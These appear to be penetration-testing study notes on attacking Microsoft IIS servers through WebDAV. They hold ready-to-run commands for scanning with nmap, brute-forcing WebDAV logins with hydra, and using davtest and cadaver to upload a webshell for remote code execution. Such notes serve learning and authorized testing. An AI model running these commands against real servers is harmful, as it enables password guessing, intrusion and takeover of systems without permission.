What is Microsoft IIS:
----------------------

> proprietary software web server with the NT family
> robust GUI for managing websites
> static and dynamic web pages ASP.NET and PHP
> port 80 or 443
> file extensions: .asp, .aspx, .config, .php

What is WebDAV:
----------------------

> extensions of HTTP-Protocol
> allow users to collaboratively edit and manage files
> web server as file server
> port 80 or 443 on IIS
> credentials needed (username and password)

WebDAV Exploitation:
----------------------

> identify if WebDAV is configured
> brute-force attack
> upload malicious .asp payload to perform RCE or reverse shell

Tools:
----------------------

> davtest - scan and exploit WebDAV
> cadaver - file uploads, downlaod, on-screen display, in-place editing, move/copy, manipulation

> nmap -sV -sC <IP> for open ports and known service-script-tools
  > webdav detect - nmap -sV -p 80 --script=http-enum <IP>
  > 401 confirms needed creds
> brute force - hydra -L /usr/share/wordlists/metasploit/common-users.txt -P /usr/share/wordlists/metasploit/common-passwords.txt <IP> http-get /webdav/

> davtest -auth <user:pass> -url <URL/webdav>

> cadaver <URL/webdav>
  > creds
    > shell
    > upload with put <location>
    > access file to execute commands
> webshells: /usr/share/webshells/
